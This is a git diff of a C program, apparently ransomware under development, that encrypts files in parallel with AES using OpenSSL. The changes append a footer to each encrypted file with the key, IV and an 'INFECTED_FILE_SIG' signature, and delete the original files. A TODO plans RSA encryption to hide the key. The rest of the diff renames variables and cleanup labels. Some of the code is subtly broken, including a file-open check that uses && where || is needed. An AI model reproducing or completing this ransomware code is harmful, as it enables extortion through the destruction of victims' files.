@@ -36,8 +36,8 @@ int main(int argc, char** argv, char** envp)
     hits = do_encrypt(&paths, key_size, mode);
     fprintf(logger, "[+] finished!\n");
     fprintf(logger, "[+] summary of statistics\n");
-    fprintf(logger, "total: %d\n", (int)cvector_size(paths));
-    fprintf(logger, "encrypted: %d\n", hits);
+    fprintf(logger, "\t total: %d\n", (int)cvector_size(paths));
+    fprintf(logger, "\t encrypted: %d\n", hits);
 
     for (int i = 0; i < cvector_size(paths); i++)
     {
@@ -221,12 +221,12 @@ int do_encrypt(cvector_vector_type(char*)* paths, int key_size, char* mode)
     int max_cores = 0;
     char* ciphername = 0;
     thread_args* args = 0;
-    pthread_t* threads = 0;
+    pthread_t* workers = 0;
 
     max_cores = sysconf(_SC_NPROCESSORS_ONLN); // get maximum number of CPU cores
     ciphername = (char*)calloc(CIPHER_NAME_LENGTH, 1);
     args = (thread_args*)calloc(1, sizeof(thread_args));
-    threads = (pthread_t*)calloc(max_cores, sizeof(pthread_t));
+    workers = (pthread_t*)calloc(max_cores, sizeof(pthread_t));
     mode[3] ^= '-';
     snprintf(ciphername, CIPHER_NAME_LENGTH, "%s-%d-%s", mode, key_size, &mode[4]);
     mode[3] ^= '-';
@@ -236,25 +236,25 @@ int do_encrypt(cvector_vector_type(char*)* paths, int key_size, char* mode)
     {
         args->paths = *paths;
         args->ciphername = ciphername;
-        pthread_create(&threads[i], 0, (void*)encryption_worker_proc, args);
+        pthread_create(&workers[i], 0, (void*)worker_encryption_proc, args);
     } 
     for (int i = 0; i < max_cores; i++)
     {
-        pthread_join(threads[i], (void*)&hits);
+        pthread_join(workers[i], (void*)&hits);
         total += hits;
     }
     pthread_mutex_destroy(&mutex);
-    memset(threads, 0, max_cores*sizeof(pthread_t));
+    memset(workers, 0, max_cores*sizeof(pthread_t));
     memset(args, 0, sizeof(thread_args));
     memset(ciphername, 0, CIPHER_NAME_LENGTH);
     free(ciphername);
     free(args);
-    free(threads);
+    free(workers);
 
     return total;
 }
 
-int encryption_worker_proc(thread_args* args)
+int worker_encryption_proc(thread_args* args)
 {
     int hits = 0;
     int cur_path_idx = 0;
@@ -293,11 +293,11 @@ int encrypt_file(char* path, char* ciphername)
 
     if (!gen_random_bytes(iv, EVP_CIPHER_iv_length(cipher)))
     {
-        goto FAILED_GEN_RAND_BYTES;
+        goto CLEANUP_GEN_RAND_BYTES;
     }
     if (!gen_random_bytes(key, EVP_CIPHER_key_length(cipher)))
     {
-        goto FAILED_GEN_RAND_BYTES;
+        goto CLEANUP_GEN_RAND_BYTES;
     }
     EVP_EncryptInit_ex(ctx, cipher, 0, key, iv);
     
@@ -318,22 +318,40 @@ int encrypt_file(char* path, char* ciphername)
     outfp = fopen(renamed_path, "wb");
     if (!infp && !outfp)
     {
-        goto FAILED_ENCRYPTION;
+        goto CLEANUP_AES_ENCRYPTION;
     }
     while ((outl = fread(in, 1, sizeof(in), infp)) > 0)
     {
         if (!EVP_EncryptUpdate(ctx, out, &outl, in, inl))
         {
-            goto FAILED_ENCRYPTION;
+            goto CLEANUP_AES_ENCRYPTION;
         }
         fwrite(out, 1, outl, outfp);
     }
     EVP_CipherFinal_ex(ctx, out, &outl);
     fwrite(out, 1, outl, outfp);
 
+    // TODO: Implement RSA encryption for hiding AES key and IV
+    footer aes_metadata = {
+        iv,
+        key,
+        ciphername_to_number(ciphername),   // identifier for cipher block mode
+        INFECTED_FILE_SIG,                  // signature
+    };
+    fwrite(aes_metadata.iv, 1, EVP_CIPHER_iv_length(cipher), outfp);
+    fwrite(aes_metadata.key, 1, EVP_CIPHER_key_length(cipher), outfp);
+    fwrite(&aes_metadata.mode, 4, 1, outfp);
+    fwrite(&aes_metadata.signature, 4, 1, outfp);
     is_encrypted = 1;
+    fprintf(logger, "\t encrypted: %s\n", renamed_path);
+    if (!remove(path))
+    {
+        fprintf(logger, "\t deleted: %s\n", path);
+    }
 
-FAILED_ENCRYPTION:
+CLEANUP_RSA_ENCRYPTION:
+    aes_metadata = (footer){0, };
+CLEANUP_AES_ENCRYPTION:
     fclose(outfp);
     fclose(infp);
     memset(renamed_path, 0, MAX_PATH_LENGTH);
@@ -342,7 +360,7 @@ FAILED_ENCRYPTION:
     free(renamed_path);
     free(out);
     free(in);
-FAILED_GEN_RAND_BYTES:
+CLEANUP_GEN_RAND_BYTES:
     memset(key, 0, EVP_CIPHER_key_length(cipher));
     memset(iv, 0, EVP_CIPHER_iv_length(cipher));
     free(key);
@@ -350,4 +368,19 @@ FAILED_GEN_RAND_BYTES:
     EVP_CIPHER_CTX_cleanup(ctx);
 
     return is_encrypted;
+}
+
+int ciphername_to_number(char* ciphername)
+{
+    for (int i = 0; i < CIPHER_NAME_LENGTH; i++)
+    {
+        ciphername[i] = tolower(ciphername[i]);
+    }
+    if (!strncmp(ciphername, "aes-128-ecb", CIPHER_NAME_LENGTH-1)) return AES_128_ECB;  // 0
+    if (!strncmp(ciphername, "aes-192-ecb", CIPHER_NAME_LENGTH-1)) return AES_192_ECB;  // 1
+    if (!strncmp(ciphername, "aes-256-ecb", CIPHER_NAME_LENGTH-1)) return AES_256_ECB;  // 2
+    if (!strncmp(ciphername, "aes-128-cbc", CIPHER_NAME_LENGTH-1)) return AES_128_CBC;  // 3
+    if (!strncmp(ciphername, "aes-192-cbc", CIPHER_NAME_LENGTH-1)) return AES_192_CBC;  // 4
+    if (!strncmp(ciphername, "aes-256-cbc", CIPHER_NAME_LENGTH-1)) return AES_256_CBC;  // 5
+    return -1;
 }
